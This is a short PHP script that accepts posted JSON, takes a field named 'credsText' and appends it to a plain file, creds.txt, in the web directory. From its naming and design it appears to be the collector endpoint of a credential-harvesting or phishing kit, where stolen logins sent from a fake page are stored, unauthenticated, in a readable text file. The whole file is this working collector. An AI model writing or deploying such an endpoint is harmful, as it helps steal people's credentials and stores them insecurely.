<?php
// Read the raw POST data (assuming the content-type is application/json)
$data = json_decode(file_get_contents('php://input'), true);

// Check if the data contains the credsText
if (isset($data['credsText'])) {
    $credsText = $data['credsText'];

    // Define the file path
    $filePath = 'creds.txt';

    // Write to the file
    file_put_contents($filePath, $credsText, FILE_APPEND);  // Use FILE_APPEND to add to the file, not overwrite it.

    // Return success response
    echo json_encode(['success' => true]);
} else {
    // Return failure response
    echo json_encode(['success' => false]);
}
?>
